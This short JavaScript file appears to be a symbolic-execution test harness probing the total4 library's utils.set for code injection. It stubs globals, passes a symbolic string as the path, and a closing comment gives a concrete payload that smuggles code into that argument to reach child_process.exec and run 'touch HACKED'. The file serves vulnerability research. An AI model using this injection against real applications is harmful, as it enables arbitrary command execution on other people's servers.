// Stub cache so utils doesn't require index.js
global.F = { temporary : { other : {} } };
global.NEWCOMMAND = function (c, cb) {};

const utils = require('total4/utils');
const esl_symbolic = require("esl_symbolic");

utils.set({}, esl_symbolic.string("payload"));
//'a;let {mainModule}=process; let {require}=mainModule; let {exec}=require("child_process"); exec("touch HACKED")//'
